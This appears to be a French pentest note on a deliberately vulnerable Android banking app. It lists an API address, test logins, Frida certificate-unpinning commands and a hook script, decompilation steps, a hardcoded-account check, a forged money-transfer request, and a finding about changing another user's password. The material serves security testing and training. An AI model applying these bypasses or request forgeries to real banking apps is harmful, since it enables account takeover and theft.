

```
API:
3.64.133.246

Creds:
JackBlack / XmcoAudit2020!
test / test
test / @Test1234
devadmin / test
devadmin / test1234

Compte banquaire:
JackBlack: 54000
test: 100000

```



![[IMG-20260313114941226.png]]

```
frida --codeshare akabe1/frida-multiple-unpinning -f com.android.xmcodroidbank -U
```

```
frida-ps -Uai | grep -i xmcodroid
frida -U -p <pid> -l anti-npe-asynctask.js
```

```java
Java.perform(function () {

var classes = [
"com.android.xmcodroidbank.DoTransfer$RequestDoGets2",
"com.android.xmcodroidbank.ChangePassword$RequestChangePasswordTask"
];

classes.forEach(function (cls) {
  
try {
  
var Target = Java.use(cls);
  
Target.doInBackground.overloads.forEach(function (ovl) {
  
ovl.implementation = function () {
try {
  
return ovl.apply(this, arguments); 

} catch (e) {
  
console.log("[!] Prevented crash in " + cls);
console.log("[!] Exception: " + e);
var retType = ovl.returnType.type;  

if (retType === "boolean") return false;
if (retType === "int") return 0;
if (retType === "void") return;
return null;
  
}
  
};
  
});
  
console.log("[+] Hook installed on " + cls); 

} catch (e) {
  
console.log("[-] Class not found: " + cls);
  
}
  
});
  
});
```


```
apktool d xmco.apk
jadx-gui xmco.apk &
```

![[IMG-20260313144558359.png]]

![[IMG-20260313142926660.png]]


```
Account:
5555555555554444
371449635398431
```

## Vuln

### Compte Hard codé dans l'app
```
if (DoLogin.this.username.equals("devadmin") || (DoLogin.this.username.equals("test") && DoLogin.this.password.equals("test")))
```
![[IMG-20260313144850272.png]]

### Transfer d'argent à volonté  
```
password=@Test1234&amount=41000&to_acc=5555555555554444&from_acc=371449635398431&label=Shopping&username=test
```

![[IMG-20260313153227268.png]]

Condition:
Le compte associé au champ `password/username` doit être diffénrent du compte associé à l'id dans le champ `to_acc`. Sinon:
![[IMG-20260313153716211.png]]

### Changement du mdp d'un autre compte que le sien 

![[IMG-20260313154432060.png]]

![[IMG-20260313154559733.png]]





